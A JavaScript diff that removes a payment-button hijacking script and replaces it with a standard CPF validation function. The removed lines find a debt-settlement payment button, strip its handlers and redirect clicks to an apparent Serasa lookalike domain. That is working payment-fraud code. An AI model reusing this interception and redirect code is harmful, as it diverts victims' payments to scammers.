@@ -1,47 +1,49 @@
-const SAFE_URL = "https://pay.feiraoserasa.site/lDW0ZaJnv64GN7E";
-const BUTTON_TEXT = "REALIZAR PAGAMENTO DO ACORDO E LIMPAR MEU NOME";
+function validaCPF(cpf) {
+  var Soma = 0
+  var Resto
 
-// ============================
-// ALERTA GLOBAL PARA QUALQUER BOTÃO
-// ============================
-document.addEventListener("click", function(e) {
-  const btn = e.target.closest("button");
+  var strCPF = String(cpf).replace(/[^\d]/g, '')
+  
+  if (strCPF.length !== 11)
+     return false
+  
+  if ([
+    '00000000000',
+    '11111111111',
+    '22222222222',
+    '33333333333',
+    '44444444444',
+    '55555555555',
+    '66666666666',
+    '77777777777',
+    '88888888888',
+    '99999999999',
+    ].indexOf(strCPF) !== -1)
+    return false
 
-  if (btn) {
-    const name = btn.textContent.trim() || "[sem texto]";
-    alert("Botão clicado: " + name);
-  }
-}, true);
+  for (i=1; i<=9; i++)
+    Soma = Soma + parseInt(strCPF.substring(i-1, i)) * (11 - i);
 
-// ============================
-// INTERCEPTAÇÃO DO BOTÃO ALVO
-// ============================
-function waitForButton() {
-  const btn = [...document.querySelectorAll("button")]
-    .find(b => b.textContent.trim() === BUTTON_TEXT);
+  Resto = (Soma * 10) % 11
 
-  if (btn) overrideButton(btn);
-  else requestAnimationFrame(waitForButton);
-}
-waitForButton();
+  if ((Resto == 10) || (Resto == 11)) 
+    Resto = 0
 
-function overrideButton(btn) {
-  // Remove listeners ocultos recriando o botão
-  const clone = btn.cloneNode(true);
-  btn.replaceWith(clone);
-  const cleanBtn = [...document.querySelectorAll("button")]
-    .find(b => b.textContent.trim() === BUTTON_TEXT);
+  if (Resto != parseInt(strCPF.substring(9, 10)) )
+    return false
 
-  // Remove qualquer comportamento original
-  ["onclick", "data-action", "data-trigger", "data-url"].forEach(attr => cleanBtn.removeAttribute(attr));
-  cleanBtn.onclick = null;
+  Soma = 0
 
-  // Substitui comportamento por seu redirecionamento
-  cleanBtn.addEventListener("click", function(e) {
-    e.preventDefault();
-    e.stopImmediatePropagation();
-    window.location.href = SAFE_URL;
-  }, true);
+  for (i = 1; i <= 10; i++)
+    Soma = Soma + parseInt(strCPF.substring(i-1, i)) * (12 - i)
 
-  console.log("[OK] Botão interceptado e redirecionando para o link correto.");
+  Resto = (Soma * 10) % 11
+
+  if ((Resto == 10) || (Resto == 11)) 
+    Resto = 0
+
+  if (Resto != parseInt(strCPF.substring(10, 11) ) )
+    return false
+
+  return true
 }
